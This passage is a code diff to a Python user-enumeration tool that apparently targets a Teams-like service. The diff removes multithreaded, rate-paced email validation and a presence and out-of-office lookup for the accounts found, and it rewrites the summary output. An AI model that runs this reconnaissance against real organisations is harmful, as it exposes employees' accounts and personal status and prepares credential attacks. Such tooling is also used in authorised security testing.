-                print_error("Aborting enumeration -- sanity check failed. Use --skip-sanity to override.")
-                sys.exit(1)
-        else:
-            print_warn("Cannot determine domain for sanity check -- skipping")
-
-    # Build the user queue
-    user_queue = queue.Queue()
-    for email in users:
-        user_queue.put(email)
-
-    # Determine threads per token from pace settings
-    threads_per_token = enum_pace["threads_per_token"]
-    token_rate = enum_pace["rate"]
-
-    # Set each token's timer to the pace rate
-    for entry in enumerator._token_pool:
-        entry.timer = IntervalTimer(token_rate)
-
-    total_threads = token_count * threads_per_token
-    print_info(f"Threads: {style(str(total_threads), TermColors.MAGENTA, TermColors.BOLD)} "
-               f"({threads_per_token}/token), "
-               f"Target rate: {style(f'~{effective_rate:.0f} req/s', TermColors.MAGENTA, TermColors.BOLD)}")
-
-    # Progress tracker
-    progress = ProgressTracker()
-    progress.begin_session(len(users))
-    progress.begin_round(len(users), label="Enumerating")
-
-    # Shared state
-    valid_users_set = set()
-    valid_mris = {}
-    results_lock = threading.Lock()
-    stop_event = threading.Event()
-    counters = {"submitted": len(users), "completed": 0, "checked": 0, "errors": 0, "rate_limited": 0}
-    counters_lock = threading.Lock()
-
-    # Launch per-token worker threads
-    threads = []
-    for token_entry in enumerator._token_pool:
-        for i in range(threads_per_token):
-            t = threading.Thread(
-                target=enumerator._token_worker,
-                args=(token_entry, user_queue, results_lock,
-                      valid_users_set, valid_mris, counters, counters_lock,
-                      logger, progress, stop_event),
-                daemon=True,
-                name=f"enum-{token_entry.username}-{i}",
-            )
-            t.start()
-            threads.append(t)
-
-    # Wait for all threads to complete — auto-print stats every 30s
-    start_time = time.monotonic()
-    last_status = start_time
-    try:
-        while any(t.is_alive() for t in threads):
-            time.sleep(1)
-            now = time.monotonic()
-            if now - last_status >= 30:
-                last_status = now
-                elapsed = now - start_time
-                with counters_lock:
-                    done = counters["completed"]
-                    rl = counters["rate_limited"]
-                    errs = counters["errors"]
-                rate = done / elapsed if elapsed > 0 else 0
-                remaining = len(users) - done
-                eta = remaining / rate if rate > 0 else 0
-                eta_str = f"{int(eta//60)}m{int(eta%60)}s" if eta < 7200 else f"{eta/3600:.1f}h"
-                rates = " ".join(f"{e.timer.current_rate:.1f}" for e in enumerator._token_pool)
-                print_info(f"[{int(elapsed)}s] {done}/{len(users)} "
-                           f"| {rate:.1f} req/s | ETA: {eta_str} "
-                           f"| 429s: {rl} | errs: {errs} "
-                           f"| rates: [{rates}] req/s")
-                sys.stdout.flush()
-    except KeyboardInterrupt:
-        print_warn("\nStopping enumeration...")
-        stop_event.set()
-        for t in threads:
-            t.join(timeout=3)
-
-    progress.end_round()
-    progress.end_session()
-
-    # Phase 2: Presence/OOO pass (only for valid users, runs after enum completes)
-    if not args.no_presence and valid_mris:
-        print_info(f"Fetching presence/OOO for {style(str(len(valid_mris)), TermColors.GREEN, TermColors.BOLD)} valid users...")
-        presence_workers = min(20, len(valid_mris))
-
-        def _fetch_and_log_presence(email, mri):
-            ooo = enumerator._fetch_presence(mri)
-            if ooo and (ooo.get("message") or ooo.get("availability")):
-                presence_str = ooo.get("availability", "")
-                ooo_msg = ooo.get("message", "")
-                display_parts = [email]
-                if presence_str:
-                    display_parts.append(f"[{presence_str}]")
-                if ooo_msg:
-                    display_parts.append(f"OOO: {ooo_msg[:80]}")
-                console_msg = f"{style('[*]', TermColors.CYAN, TermColors.BOLD)} {' '.join(display_parts)}"
-                print(console_msg)
-                logger.log_enum_detail({
-                    "timestamp": utc_now_str(),
-                    "email": email,
-                    "presence_update": True,
-                    "presence": presence_str,
-                    "out_of_office": ooo_msg,
-                })
-
-        with ThreadPoolExecutor(max_workers=presence_workers) as executor:
-            presence_futures = []
-            for email, mri in valid_mris.items():
-                if mri:
-                    presence_futures.append(executor.submit(_fetch_and_log_presence, email, mri))
-            for f in as_completed(presence_futures):
-                try:
-                    f.result()
-                except Exception:
-                    pass
-
-        print_success("Presence/OOO pass complete")
-
-    _print_enum_summary(logger, valid_users_set, users, counters)
+def _print_enum_summary(logger, valid_users, all_users, counters):
+    print("\n" + style("--- Enumeration Summary ---", TermColors.BOLD, TermColors.CYAN))
+    print(f"Total Candidates:    {style(str(len(all_users)), TermColors.BOLD)}")
+    print(f"Completed:           {style(str(counters['completed']), TermColors.BOLD)}")
+    print(f"Valid Users Found:   {style(str(counters['valid']), TermColors.GREEN, TermColors.BOLD)}")
+    print(f"Not Found:           {style(str(counters['not_found']), TermColors.DIM)}")
+    print(f"Errors/Timeouts:     {style(str(counters['errors']), TermColors.YELLOW, TermColors.BOLD)}")
+    coverage = (counters["completed"] / len(all_users) * 100) if all_users else 0
+    print(f"Coverage:            {style(f'{coverage:.1f}%', TermColors.CYAN, TermColors.BOLD)}")
+    print(f"Results Directory:   {style(str(logger.run_dir), TermColors.CYAN, TermColors.BOLD)}")
+    if logger.files["enumerated"].exists():
+        print(f"Valid Users File:    {style(str(logger.files['enumerated']), TermColors.GREEN)}")
+    print(style("----------------------------", TermColors.BOLD, TermColors.CYAN))
 
 
 def _print_summary(logger, locked_users, invalid_users):
@@ -1699,38 +856,6 @@ def _print_summary(logger, locked_users, invalid_users):
             print(f"  {style('-', TermColors.DIM)} {u}")
     print(f"Results Directory:   {style(str(logger.run_dir), TermColors.CYAN, TermColors.BOLD)}")
     print(style("--------------------------", TermColors.BOLD, TermColors.CYAN))
-
-
-def _print_enum_summary(logger, valid_users, all_users, counters):
-    print("\n" + style("--- Enumeration Summary ---", TermColors.BOLD, TermColors.CYAN))
-    submitted = counters["submitted"]
-    completed = counters["completed"]
-    checked = counters["checked"]
-    errors = counters["errors"]
-    rate_limited = counters["rate_limited"]
-    valid = len(valid_users)
-    not_valid = checked - valid
-    missed = submitted - completed
-
-    print(f"Total Candidates:    {style(str(len(all_users)), TermColors.BOLD)}")
-    print(f"Submitted:           {style(str(submitted), TermColors.BOLD)}")
-    print(f"Completed:           {style(str(completed), TermColors.BOLD)}")
-    print(f"Checked (definitive): {style(str(checked), TermColors.BOLD)}")
-    print(f"Valid Users Found:   {style(str(valid), TermColors.GREEN, TermColors.BOLD)}")
-    print(f"Not Valid:           {style(str(not_valid), TermColors.DIM)}")
-    print(f"Errors/Timeouts:     {style(str(errors), TermColors.YELLOW, TermColors.BOLD)}")
-    if rate_limited > 0:
-        print(f"Rate Limited (429):  {style(str(rate_limited), TermColors.YELLOW, TermColors.BOLD)}")
-    if missed > 0:
-        print(f"Missed (not run):    {style(str(missed), TermColors.RED, TermColors.BOLD)}")
-    coverage = (checked / len(all_users) * 100) if len(all_users) > 0 else 0
-    print(f"Coverage:            {style(f'{coverage:.1f}%', TermColors.CYAN, TermColors.BOLD)}")
-    print(f"Results Directory:   {style(str(logger.run_dir), TermColors.CYAN, TermColors.BOLD)}")
-    if logger.files["enumerated"].exists():
-        print(f"Valid Users File:    {style(str(logger.files['enumerated']), TermColors.GREEN)}")
-    if logger.files["enum_details"].exists():
-        print(f"Detailed JSON:       {style(str(logger.files['enum_details']), TermColors.GREEN)}")
-    print(style("----------------------------", TermColors.BOLD, TermColors.CYAN))
 
 
 if __name__ == "__main__":
